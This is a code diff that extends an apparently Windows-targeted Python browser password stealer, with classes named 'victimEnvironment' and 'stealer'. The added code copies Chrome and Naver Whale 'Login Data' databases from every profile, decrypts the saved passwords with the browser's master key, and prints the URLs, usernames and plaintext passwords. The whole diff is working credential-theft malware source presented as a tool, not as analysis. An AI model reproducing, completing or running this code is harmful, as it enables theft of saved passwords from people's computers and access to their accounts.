@@ -1,6 +1,8 @@
 import os
 import base64
 import json
+import shutil
+import sqlite3
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 from typing import Dict,List
@@ -13,7 +15,7 @@ class victimEnvironment:
             "chrome": f"{self.appdataLocalPath}\\Google\\Chrome\\User Data",
             "whale":  f"{self.appdataLocalPath}\\Naver\\Naver Whale\\User Data",
         }
-        self.browserInformationFilePath:Dict[str, Dict[str, str]] = {
+        self.browserCredentialInformation:Dict[str, Dict[str, str]] = {
             "loginData": {
                 "query": "SELECT action_url, username_value, password_value FROM logins",
                 "subPath": "\\Login Data"
@@ -71,10 +73,33 @@ class stealer:
             decryptedPassword:str = decryptedPassword[:-16].decode()
             return decryptedPassword
         except Exception as e:
-            return str(e)
+            raise Exception(f"[!] Error while decrypting the password: {e}")
+
+    # Obtain data
+    def getData(self, dbPath: str, sqlQuery: str, masterKey: bytes) -> List[str]:
+        try:
+            shutil.copy2(dbPath, "./tmp.db")
+            db:sqlite3.Connection = sqlite3.connect("./tmp.db")
+            cursor:sqlite3.Cursor = db.cursor()
+            cursor.execute(sqlQuery)
+            data:List[str] = cursor.fetchall()
+            for row in data:
+                url:str = row[0]
+                username:str = row[1]
+                encryptedPassword:bytes = row[2]
+                decryptedPassword:str = self.decryptPassword(encryptedPassword, masterKey)
+                print(f"[+] - URL: {url}")
+                print(f"[+] - Username: {username}")
+                print(f"[+] - Password: {decryptedPassword}")
+            db.close()
+            os.remove("./tmp.db")
+        except Exception as exception:
+            print(f"[!] {exception}")
+
 
 if __name__ == "__main__":
     victim = victimEnvironment()
+    stealer = stealer()
     existingBrowsers:List[str] = victim.checkBrowserInstallation()
     for browser in existingBrowsers:
         print(f"[+] {browser} is installed")
@@ -83,3 +108,10 @@ if __name__ == "__main__":
         # get profile
         profileList:List[str] = victim.searchProfiles(victim.browserPath[browser])
         print(f"[+] {browser} has {len(profileList)} profile(s)")
+
+        # get data
+        for profile in profileList:
+            print(f"[+] - Profile: {profile}")
+            stealer.getData(dbPath = f"{victim.browserPath[browser]}\\{profile}\\{victim.browserCredentialInformation['loginData']['subPath']}", 
+                            sqlQuery = victim.browserCredentialInformation['loginData']['query'],
+                            masterKey = victim.getMasterKey(victim.browserPath[browser]))
